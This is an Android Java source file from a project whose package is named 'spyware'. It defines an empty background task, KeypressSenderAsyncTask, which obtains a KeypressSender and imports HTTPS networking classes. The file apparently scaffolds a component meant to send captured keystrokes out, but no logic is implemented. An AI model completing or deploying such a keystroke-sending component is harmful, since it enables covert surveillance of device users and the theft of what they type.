package com.example.cristianturetta.spyware;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.FileObserver;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;

public class KeypressSenderAsyncTask extends AsyncTask<String,Void,Void> {
    private KeypressSender keypressSender;

    public KeypressSenderAsyncTask() {
        keypressSender = KeypressSender.getInstance();

    }

    @Override
    protected Void doInBackground(String... voids) {




        return null;
    }
}